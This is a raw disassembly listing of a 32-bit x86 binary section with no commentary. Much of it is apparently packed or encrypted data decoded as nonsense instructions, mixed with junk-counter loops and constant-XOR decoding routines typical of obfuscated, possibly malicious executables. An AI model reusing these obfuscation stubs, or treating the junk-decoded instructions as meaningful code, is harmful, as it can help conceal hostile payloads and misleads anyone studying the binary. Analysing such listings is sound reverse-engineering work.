  40530d:	pop    edx
  40530e:	shl    ebp,1
  405310:	sub    al,0x87
  405312:	jecxz  0x405375
  405314:	stos   DWORD PTR es:[edi],eax
  405315:	test   BYTE PTR [eax+0x19],cl
  405318:	(bad)  
  405319:	mov    al,0x71
  40531b:	pusha  
  40531c:	jg     0x4052d9
  40531e:	shr    DWORD PTR [edi+0x36],1
  405321:	test   DWORD PTR [edx+0x2f],edi
  405324:	hlt    
  405325:	out    dx,al
  405326:	add    eax,0x75ed1a4f
  40532b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40532c:	xchg   ebp,eax
  40532d:	(bad)  
  40532e:	(bad)  
  40532f:	lock int 0xc7
  405332:	xlat   BYTE PTR ds:[ebx]
  405333:	in     al,dx
  405334:	sbb    eax,0x3764362c
  405339:	scas   al,BYTE PTR es:[edi]
  40533a:	xchg   ch,cl
  40533c:	mov    ecx,0xe641b2b7
  405341:	mov    ebx,0xae93fe81
  405346:	cmc    
  405347:	ss jno 0x405382
  40534a:	add    dl,ch
  40534c:	test   BYTE PTR [esi-0x76],dh
  40534f:	push   ebx
  405350:	mov    al,0x5f
  405352:	addr16 pop ds
  405354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405355:	mov    ecx,0x4fc351d3
  40535a:	xor    dh,BYTE PTR [eax+0x74]
  40535d:	add    ebp,ebx
  40535f:	and    dh,cl
  405361:	test   eax,0x3a41aee7
  405366:	xchg   ebx,eax
  405367:	xor    al,BYTE PTR [ecx-0x53b96def]
  40536d:	mov    ah,0x84
  40536f:	fst    QWORD PTR [ecx-0x3f037a9c]
  405375:	outs   dx,BYTE PTR ds:[esi]
  405376:	pushf  
  405377:	sbb    DWORD PTR [ecx],ebx
  405379:	out    dx,eax
  40537a:	ret    
  40537b:	cmp    dl,cl
  40537d:	cwde   
  40537e:	add    eax,0x54d9750e
  405383:	jp     0x405341
  405385:	iret   
  405386:	push   0x7d60b765
  40538b:	imul   edx,ebp,0x9172e4fd
  405391:	dec    ebp
  405392:	dec    ebx
  405393:	xchg   edx,eax
  405394:	mov    BYTE PTR [ebx+0xd],bh
  405397:	into   
  405398:	dec    ecx
  405399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40539a:	cmp    dh,BYTE PTR [ebx+0x563a275a]
  4053a0:	je     0x405385
  4053a2:	mov    edx,0x929a77a8
  4053a7:	jmp    0x4cac7884
  4053ac:	shl    BYTE PTR [eax+0x7],0x82
  4053b0:	push   ss
  4053b1:	jo     0x405354
  4053b3:	jmp    0xa2ea:0x487b2f8a
  4053ba:	push   cs
  4053bb:	cwde   
  4053bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053bd:	pop    ss
  4053be:	fincstp 
  4053c0:	mov    ds:0x110e7e19,eax
  4053c5:	jae    0x40534b
  4053c7:	or     eax,0x81e1f8bd
  4053cc:	sbb    ebx,ecx
  4053ce:	xchg   ebp,eax
  4053cf:	cwde   
  4053d0:	mov    ecx,0x2a576d4d
  4053d5:	sub    eax,0x1cbe75a7
  4053da:	leave  
  4053db:	jbe    0x405361
  4053dd:	push   esi
  4053de:	pop    ecx
  4053df:	mov    cl,0x3c
  4053e1:	(bad)  [edx]
  4053e3:	scas   al,BYTE PTR es:[edi]
  4053e4:	lea    esp,[edx]
  4053e6:	push   eax
  4053e7:	push   ds
  4053e8:	add    eax,0xaae8da11
  4053ed:	mov    ss,edi
  4053ef:	mov    cl,0x6b
  4053f1:	push   edx
  4053f2:	aam    0x2b
  4053f4:	mov    esp,0x32547dc8
  4053f9:	push   esi
  4053fa:	loop   0x4053c1
  4053fc:	pop    ebx
  4053fd:	ins    DWORD PTR es:[edi],dx
  4053fe:	jmp    0x4053d4
  405400:	call   0xee3924e9
  405405:	scas   eax,DWORD PTR es:[edi]
  405406:	adc    ecx,eax
  405408:	retf   
  405409:	add    BYTE PTR [esi+0x26],dh
  40540c:	or     al,0x83
  40540e:	inc    esp
  40540f:	stos   DWORD PTR es:[edi],eax
  405410:	pusha  
  405411:	or     dh,BYTE PTR [edx-0x3e]
  405414:	and    eax,0x2086f4e9
  405419:	ja     0x405499
  40541b:	repz and ch,dh
  40541e:	lods   eax,DWORD PTR ds:[esi]
  40541f:	sbb    DWORD PTR [ebp+edx*2+0x68],esi
  405423:	(bad)  
  405424:	jg     0x40544f
  405426:	xor    ebx,DWORD PTR [ebx-0x706173c9]
  40542c:	lods   al,BYTE PTR ds:[esi]
  40542d:	(bad)  
  40542e:	or     edx,DWORD PTR [eax+ecx*2+0xcfb471f]
  405435:	cmp    bh,BYTE PTR [edi-0x6480bf4a]
  40543b:	je     0x405426
  40543d:	icebp  
  40543e:	je     0x4053d8
  405440:	fidiv  WORD PTR [ecx+ebx*2-0x4e]
  405444:	loope  0x4053db
  405446:	inc    esp
  405447:	mov    DWORD PTR [ebx-0x63],esi
  40544a:	push   esp
  40544b:	jmp    0xaa9716e6
  405450:	adc    ebp,DWORD PTR [edi]
  405452:	jecxz  0x405459
  405454:	ds pop ebp
  405456:	lock mov ds:0xc161b7ac,al
  40545c:	aas    
  40545d:	or     eax,0xb9d07e88
  405462:	icebp  
  405463:	in     eax,dx
  405464:	shl    bl,cl
  405466:	xchg   ebp,eax
  405467:	push   ebx
  405468:	mov    cl,0x24
  40546a:	fidivr WORD PTR [ecx-0x59156b06]
  405470:	push   0x6
  405472:	jg     0x405451
  405474:	pop    ebx
  405475:	push   ecx
  405476:	pop    edi
  405477:	dec    ecx
  405478:	mov    DWORD PTR [edx+0x8],eax
  40547b:	mov    eax,DWORD PTR [ebp+0x1c]
  40547e:	mov    edx,DWORD PTR [ebp+0x10]
  405481:	mov    DWORD PTR [edx+0xc],eax
  405484:	mov    eax,DWORD PTR [ebp+0x20]
  405487:	mov    edx,DWORD PTR [ebp+0x10]
  40548a:	mov    DWORD PTR [edx+0x10],eax
  40548d:	mov    eax,eax
  40548f:	mov    eax,DWORD PTR [ebp+0x14]
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x43035f
  4054d4:	sbb    DWORD PTR ds:0x4302c5,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x4302f1,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x4302d5,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x430363,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x4302d5,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x4302d5
  40552a:	inc    eax
  40552b:	mov    ds:0x4302d5,eax
  405530:	cmp    DWORD PTR ds:0x4302d5,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x4302d5,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ea97
  405555:	cmp    DWORD PTR ds:0x4302d5,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x4302d5
  405567:	inc    eax
  405568:	mov    ds:0x4302d5,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x4302f1,0x14
  40557c:	cmp    DWORD PTR ds:0x4302f1,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x4302f1,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42e923
  4055a2:	cmp    DWORD PTR ds:0x4302f1,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x4302f1
  4055b7:	dec    eax
  4055b8:	mov    ds:0x4302f1,eax
  4055bd:	mov    eax,ds:0x4302f1
  4055c2:	dec    eax
  4055c3:	mov    ds:0x4302f1,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ec53,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0x35a2c60a
  4055e5:	mov    cl,0x3b
  4055e7:	ss sub bh,BYTE PTR ss:[esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x4055d9
  4055f1:	mov    ecx,DWORD PTR [bp+di+0x200d]
  4055f6:	pusha  
  4055f7:	mov    edx,0x533388c1
  4055fc:	imul   edx,DWORD PTR [edx-0x7ab118cc],0xffffffcf
  405603:	lea    ebp,[edi+0x50]
  405606:	mov    al,ds:0xa2491efa
  40560b:	loope  0x405679
  40560d:	outs   dx,DWORD PTR ds:[esi]
  40560e:	(bad)  
  40560f:	in     al,dx
  405610:	popa   
  405611:	jmp    0xe751025e
  405616:	xchg   ebp,eax
  405617:	iret   
  405618:	push   ebp
  405619:	rcr    BYTE PTR [ecx-0x1b47583a],cl
  40561f:	sub    eax,0x41cab93d
  405624:	jmp    0x6066:0x92c1a6c0
  40562b:	mov    dh,0xb
  40562d:	(bad)  
  40562e:	xor    BYTE PTR [edx-0x50],al
  405631:	ret    0xa8ae
  405634:	adc    BYTE PTR [esi],cl
  405636:	xor    al,bl
  405638:	scas   al,BYTE PTR es:[edi]
  405639:	push   esi
  40563a:	js     0x405687
  40563c:	add    ah,BYTE PTR [ecx+esi*8-0x18ab975b]
  405643:	mov    ds:0x4bf411d7,eax
  405648:	push   ss
  405649:	mov    ch,0x59
  40564b:	mov    dh,0xb9
  40564d:	push   ecx
  40564e:	fistp  WORD PTR [ecx]
  405650:	test   BYTE PTR [ecx+0x53aaf112],bh
  405656:	jnp    0x405698
  405658:	les    ecx,FWORD PTR [esi-0x6412c607]
  40565e:	or     eax,0xaeedeb38
  405663:	aad    0x42
  405665:	call   FWORD PTR [eax]
  405667:	cld    
  405668:	vmwrite esp,DWORD PTR [ebx+0x1538849c]
  40566f:	test   DWORD PTR [ecx],edx
  405671:	inc    eax
  405672:	ror    BYTE PTR [edi],0x54
  405675:	les    esi,FWORD PTR [esi-0x56]
  405678:	and    edx,ebp
  40567a:	aaa    
  40567b:	xlat   BYTE PTR ds:[ebx]
  40567c:	sbb    DWORD PTR [ecx+0x35efc143],ecx
  405682:	sbb    BYTE PTR [eax+0x576dbb3d],ah
  405688:	fimul  WORD PTR [eax]
  40568a:	cmp    eax,0x7f2ec960
  40568f:	aaa    
  405690:	cmp    DWORD PTR [eax+0x1ae06899],0x56
  405697:	add    DWORD PTR [ecx],edi
  405699:	mov    ecx,DWORD PTR [ebx-0x2b]
  40569c:	pop    es
  40569d:	(bad)  
  40569e:	mov    ebp,gs
  4056a0:	push   ebp
  4056a1:	or     bh,BYTE PTR [edi+0x6eea37b8]
  4056a7:	fisub  WORD PTR [esi]
  4056a9:	jmp    0x405728
  4056ab:	dec    esp
  4056ac:	dec    ecx
  4056ad:	jnp    0x405710
  4056af:	push   ebx
  4056b0:	fsub   st(4),st
  4056b2:	pop    ebp
  4056b3:	sub    al,0x4b
  4056b5:	mov    ebx,0x5d7df51b
  4056ba:	clc    
  4056bb:	or     BYTE PTR [ebx],ch
  4056bd:	hlt    
  4056be:	cmp    BYTE PTR [esi+ebx*8-0x46c99d5a],dl
  4056c5:	xchg   esp,eax
  4056c6:	jg     0x4056c5
  4056c8:	ret    0x575c
  4056cb:	mov    esi,0x67bfa88b
  4056d0:	shr    ecx,cl
  4056d2:	inc    ebp
  4056d3:	xchg   dh,ah
  4056d5:	add    ebx,ecx
  4056d7:	ja     0x40571c
  4056d9:	loop   0x405735
  4056db:	jp     0x4056ee
  4056dd:	stc    
  4056de:	adc    cl,BYTE PTR [edi+0x34]
  4056e1:	int3   
  4056e2:	test   BYTE PTR [edx+eax*4-0x4c7fda31],bl
  4056e9:	jmp    0xfbe9e386
  4056ee:	mov    cl,0x9c
  4056f0:	fild   DWORD PTR [ecx-0x4a7f90bf]
  4056f6:	sbb    bh,BYTE PTR [edx-0x14a983a7]
  4056fc:	icebp  
  4056fd:	rcr    BYTE PTR cs:[edi-0x74cddfda],cl
  405704:	xchg   DWORD PTR [ecx+0x6431207e],esi
  40570a:	lds    eax,FWORD PTR [eax+0x2272c8b5]
  405710:	clc    
  405711:	push   ss
  405712:	pop    edi
  405713:	test   BYTE PTR [edi+0x6a7995ba],dh
  405719:	popf   
  40571a:	push   esp
  40571c:	sahf   
  40571d:	sbb    dh,dh
  40571f:	fs (bad) 
  405722:	in     al,dx
  405723:	fisttp DWORD PTR [ecx]
  405725:	jmp    0xae82:0x648917e1
  40572c:	jnp    0x405765
  40572e:	pop    ds
  40572f:	dec    edi
  405730:	xchg   esi,eax
  405731:	xchg   BYTE PTR [edi+0x39],bh
  405734:	lea    ebp,[ebx+0x3f]
  405737:	call   0x6eee:0x4e2632ea
  40573e:	mov    ebp,0x7e554379
  405743:	adc    dl,BYTE PTR [esi]
  405745:	(bad)  
  405746:	rcr    BYTE PTR [edi+edx*2-0x6c6731b0],0xa6
  40574e:	pop    ecx
  40574f:	mov    edx,0xefe2111f
  405754:	xchg   DWORD PTR [eax+0x11],edi
  405757:	mov    esi,0x313fca8
  40575c:	fsubr  QWORD PTR [esi+esi*4]
  40575f:	imul   eax,DWORD PTR [ecx-0x73],0xe139ebb4
  405766:	inc    edx
  405767:	push   ebx
  405768:	mov    al,0xa1
  40576a:	jecxz  0x40572a
  40576c:	mov    cl,0xf4
  40576e:	(bad)  
  40576f:	fcomp  DWORD PTR [eax]
  405771:	inc    edx
  405772:	and    bh,dh
  405774:	adc    al,0x7f
  405776:	pop    edx
  405777:	inc    ebx
  405778:	xchg   esi,eax
  405779:	pop    ebp
  40577a:	mov    DWORD PTR [edi-0x54c332f9],edi
  405780:	sub    DWORD PTR ds:0x5028d06,ecx
  405786:	mov    ds,WORD PTR [edi+ebx*4-0x4e]
  40578a:	rol    BYTE PTR [ebx],0xef
  40578d:	push   edx
  40578e:	and    BYTE PTR [eax+0x6ac42ab6],cl
  405794:	ret    0xbe7d
  405797:	in     al,dx
  405798:	pusha  
  405799:	out    dx,al
  40579a:	lods   al,BYTE PTR ds:[esi]
  40579b:	adc    al,0x21
  40579d:	gs inc esp
  40579f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057a0:	pop    esp
  4057a1:	pop    edx
  4057a2:	stos   BYTE PTR es:[edi],al
  4057a3:	sahf   
  4057a4:	xchg   ebx,eax
  4057a5:	or     cl,BYTE PTR [ebx]
  4057a7:	stos   DWORD PTR es:[edi],eax
  4057a8:	ds xchg esp,eax
  4057aa:	aam    0xf3
  4057ac:	xchg   BYTE PTR fs:[ebp-0x78c4a8d1],ch
  4057b3:	push   0x894604e3
  4057b8:	inc    esi
  4057b9:	xor    ah,BYTE PTR [eax+0x47]
  4057bc:	lods   eax,DWORD PTR ds:[esi]
  4057bd:	(bad)  
  4057be:	push   ebp
  4057bf:	mov    dh,0xaa
  4057c1:	aad    0x46
  4057c3:	xchg   DWORD PTR [edx],edi
  4057c5:	fsubr  QWORD PTR [eax]
  4057c7:	daa    
  4057c8:	and    BYTE PTR [edi],bh
  4057ca:	sti    
  4057cb:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  4057d2:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4057dc:	cmp    DWORD PTR ds:0x42ec5b,0x0
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ec5b,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e857
  4057ff:	mov    eax,ds:0x42ec5b
  405804:	dec    eax
  405805:	mov    ds:0x42ec5b,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e648
  40581d:	or     DWORD PTR ds:0x4302c5,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x4302b9,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e654,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ec6f
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ec5b,0x1c
  405863:	cmp    DWORD PTR ds:0x42ec5b,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ec5b,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e85b
  405886:	cmp    DWORD PTR ds:0x42ec5b,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ec5b
  405898:	dec    eax
  405899:	mov    ds:0x42ec5b,eax
  40589e:	mov    eax,ds:0x42ec5b
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ec5b,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x4302c1,0x42ec53
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x4302b5,0x42e644
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x430353,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x4302dd
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x4302bd
  4058ec:	xor    DWORD PTR ds:0x4302e1,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x4302d1,0x42ec6f
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x4302c1,0x42e648
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x4302c1
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ec53,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42ec6b
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x4302e9,0x43036b
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x4302e9,0x42e648
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x430353
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x430353,0x42e654
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x4302bd,0x42ec5b
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42ec4f,0x42ec6b
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x4302d5
  405986:	sbb    eax,DWORD PTR ds:0x4302ed
  40598c:	mov    ds:0x4302d5,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	lods   eax,DWORD PTR ds:[esi]
  4059a3:	push   ebp
  4059a4:	xor    eax,0x7e280d53
  4059a9:	jle    0x405a00
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x4059d5
  4059af:	stos   BYTE PTR es:[edi],al
  4059b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059b1:	push   esp
  4059b2:	inc    eax
  4059b3:	addr16 in al,dx
  4059b5:	in     eax,0x7c
  4059b7:	push   edx
  4059b8:	or     al,al
  4059ba:	sar    DWORD PTR [edi+0x4c],1
  4059bd:	cmp    ch,BYTE PTR [ebp-0x5b777686]
  4059c3:	cmp    dh,BYTE PTR [eax]
  4059c5:	cmp    eax,0x7ad780c6
  4059ca:	aam    0x5
  4059cc:	call   0x2ef7:0x3a6cb6f0
  4059d3:	popf   
  4059d4:	push   esp
  4059d5:	(bad)
  4059d8:	xor    DWORD PTR [eax+0x41],esi
  4059db:	mov    cl,0x24
  4059dd:	hlt    
  4059de:	ret    0xa8cf
  4059e1:	out    0x34,al
  4059e3:	nop
  4059e4:	pop    edx
  4059e5:	sbb    al,0x2a
  4059e7:	je     0x405975
  4059e9:	ficomp WORD PTR [ecx+0x24b9967c]
  4059ef:	jp     0x4059c1
  4059f1:	lods   eax,DWORD PTR ds:[esi]
  4059f2:	sub    esp,DWORD PTR [ebp+0x4f]
  4059f5:	jbe    0x4059b3
  4059f7:	adc    ah,BYTE PTR [esi-0x6c]
  4059fa:	xor    BYTE PTR ds:0x444e8a2c,bl
  405a00:	pop    esp
  405a01:	scas   eax,DWORD PTR es:[edi]
  405a02:	aam    0x6
  405a04:	rcr    edi,0xb4
  405a07:	arpl   di,ax
  405a09:	dec    edx
  405a0a:	push   ebx
  405a0b:	je     0x405a6e
  405a0d:	jbe    0x405a7e
  405a0f:	ja     0x405a13
  405a11:	mov    ebp,0x720a35f1
  405a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a17:	pop    esi
  405a18:	xchg   esi,eax
  405a19:	scas   eax,DWORD PTR es:[edi]
  405a1a:	int3   
  405a1b:	sbb    al,0x5b
  405a1d:	inc    ebp
  405a1e:	(bad)  
  405a1f:	dec    ebp
  405a20:	in     al,dx
  405a21:	jo     0x87dafc64
  405a27:	or     eax,0xd46fb348
  405a2c:	pop    ebp
  405a2d:	(bad)  
  405a2e:	push   esi
  405a2f:	adc    DWORD PTR [edi+0x34],ebx
  405a32:	sub    ah,bl
  405a34:	push   0xffffff9a
  405a36:	xchg   DWORD PTR [ebx],edi
  405a38:	mov    ebp,0x9fb52cf5
  405a3d:	mov    bh,0x74
  405a3f:	add    DWORD PTR [eax],esp
  405a41:	ds inc esp
  405a43:	push   ebx
  405a44:	scas   eax,DWORD PTR es:[edi]
  405a45:	push   ss
  405a46:	shl    BYTE PTR [esi],1
  405a48:	mov    al,BYTE PTR [esi+0x2e]
  405a4b:	verw   WORD PTR [edi]
  405a4e:	fisub  DWORD PTR [ebx]
  405a50:	sbb    BYTE PTR [ebx-0x199a6cc2],dl
  405a56:	fld    st(5)
  405a58:	data16 mov ah,0xa
  405a5b:	inc    esp
  405a5c:	mov    BYTE PTR [ebp-0x3a89cdc1],bh
  405a62:	mov    eax,ds:0x57619553
  405a67:	dec    eax
  405a68:	inc    esp
  405a69:	mov    ecx,0xa044c6f2
  405a6e:	in     eax,dx
  405a6f:	das    
  405a70:	push   edx
  405a71:	pop    es
  405a72:	cmp    bh,al
  405a74:	mov    bl,0xa4
  405a76:	xchg   esp,eax
  405a77:	dec    esp
  405a78:	sbb    al,0x4b
  405a7a:	or     eax,0x95872566
  405a7f:	sbb    BYTE PTR ss:[ebx],0x7b
  405a83:	push   0xae180bef
  405a88:	(bad)  
  405a89:	cs mov esp,0xb00d04f4
  405a8f:	mov    esi,0x65311678
  405a94:	ffree  st(7)
  405a96:	shr    BYTE PTR [edx-0x3ffc4af1],cl
  405a9c:	test   DWORD PTR [ecx],ecx
  405a9e:	push   eax
  405a9f:	and    esp,esp
  405aa1:	adc    dh,BYTE PTR [eax]
  405aa3:	xor    eax,0xa97c269a
  405aa8:	std    
  405aa9:	lahf   
  405aaa:	jne    0x405a5f
  405aac:	cmp    bh,0xfe
  405aaf:	ins    DWORD PTR es:[edi],dx
  405ab0:	ins    BYTE PTR es:[edi],dx
  405ab1:	adc    DWORD PTR [esi+edx*1+0x21],esi
  405ab5:	js     0x405a55
  405ab7:	sub    ah,al
  405ab9:	cwde   
  405aba:	xor    BYTE PTR [ebx+ebx*1-0x100feff9],ah
  405ac1:	or     DWORD PTR [esi+0x4f],eax
  405ac4:	in     eax,dx
  405ac5:	aam    0x60
  405ac7:	jg     0x405ab6
  405ac9:	and    ax,0xd79f
  405acd:	sbb    eax,0xc282c1c7
  405ad2:	ffree  st(4)
  405ad4:	and    eax,0x117c9c32
  405ad9:	mov    al,ds:0xa82b708e
  405ade:	jb     0x405a76
  405ae0:	in     al,0x4a
  405ae2:	aam    0x5a
  405ae4:	mov    esp,0x517bd41d
  405ae9:	xchg   edi,eax
  405aea:	pop    ecx
  405aeb:	mov    ah,0x21
  405aed:	xor    al,ch
  405aef:	test   BYTE PTR [esi+0x4f8aa7e3],dh
  405af5:	std    
  405af6:	bound  edi,QWORD PTR [eax+0x28497558]
  405afc:	mov    edi,0xe58e91db
  405b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b02:	popf   
  405b03:	shl    BYTE PTR [eax],1
  405b05:	or     DWORD PTR [ecx],ebp
  405b07:	dec    eax
  405b08:	cmp    DWORD PTR [ebx-0x48],ecx
  405b0b:	aas    
  405b0c:	fcmovnu st,st(1)
  405b0e:	outs   dx,DWORD PTR ds:[esi]
  405b0f:	mov    BYTE PTR [ecx+ebx*8-0x5ea4dba7],ch
  405b16:	arpl   WORD PTR [ecx],cx
  405b18:	test   eax,0xff17ac4d
  405b1d:	popf   
  405b1e:	test   al,0xae
  405b20:	je     0x405b04
  405b22:	pop    eax
  405b23:	dec    esp
  405b24:	mov    BYTE PTR [esi+0x4c],al
  405b27:	fwait
  405b28:	pop    edi
  405b29:	ja     0x405ace
  405b2b:	xchg   edi,eax
  405b2c:	inc    edi
  405b2d:	ja     0x405b39
  405b2f:	push   edx
  405b30:	adc    cl,BYTE PTR [esi]
  405b32:	push   ebx
  405b33:	xchg   esp,eax
  405b34:	in     eax,dx
  405b35:	mov    ebp,0x7b6215c7
  405b3a:	pop    ebx
  405b3b:	adc    eax,0x133b7dbc
  405b40:	or     al,ch
  405b42:	push   ds
  405b43:	jecxz  0x405b90
  405b45:	repz into 
  405b47:	xchg   edi,eax
  405b48:	mov    eax,0x31f71f6c
  405b4d:	fdiv   st,st(1)
  405b4f:	or     eax,0xcf643bb5
  405b54:	dec    eax
  405b55:	mov    ?,ecx
  405b57:	loop   0x405b5e
  405b59:	pop    ebp
  405b5a:	inc    ebx
  405b5b:	(bad)  
  405b5c:	ja     0x405af6
  405b5e:	sub    BYTE PTR ds:0xe9447350,dh
  405b64:	dec    ebx
  405b65:	mov    edi,0x579d42af
  405b6a:	cmp    eax,0x65e0b9ab
  405b6f:	xchg   ebx,ebx
  405b71:	or     al,0x8a
  405b73:	and    al,0x95
  405b75:	mov    eax,DWORD PTR [di]
  405b78:	and    esp,DWORD PTR [esi]
  405b7a:	les    ecx,FWORD PTR [eax]
  405b7c:	(bad)
  405b7f:	adc    DWORD PTR [ebx+0x27318c9a],0xd88d4703
  405b89:	mov    eax,DWORD PTR [ebp-0x14]
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	aam    0x24
  405bad:	frstor [edi+0x60]
  405bb0:	sub    DWORD PTR [esi+0x7e],edi
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405c05
  405bb8:	imul   esp,ebp,0xc7ac8bd8
  405bbe:	mov    ds:0x118de138,eax
  405bc3:	int3   
  405bc4:	push   cs
  405bc5:	jne    0x405c06
  405bc7:	add    dh,BYTE PTR [eax]
  405bc9:	sbb    DWORD PTR [edx+eiz*2],ecx
  405bcc:	mov    edx,0xca3c1a4f
  405bd1:	xchg   esp,eax
  405bd2:	aaa    
  405bd3:	inc    esp
  405bd4:	push   esp
  405bd5:	std    
  405bd6:	jmp    0xfb0faaed
  405bdb:	lea    edi,[ebp-0x3c]
  405bde:	sub    DWORD PTR [edi+0x3274ec10],ecx
  405be4:	jp     0x405bc9
  405be6:	imul   eax,DWORD PTR [ebx+ebx*2],0x33b3596b
  405bed:	fisttp DWORD PTR [eax]
  405bef:	cld    
  405bf0:	xor    ebp,DWORD PTR [ecx-0x80]
  405bf3:	clc    
  405bf4:	rcl    ebx,1
  405bf6:	xchg   ebx,eax
  405bf7:	push   ebp
  405bf8:	mov    esp,0x6444c7a
  405bfd:	xor    DWORD PTR [ebx],eax
  405bff:	idiv   al
  405c01:	and    ebp,esi
  405c03:	scas   al,BYTE PTR es:[edi]
  405c04:	mov    dh,0xcd
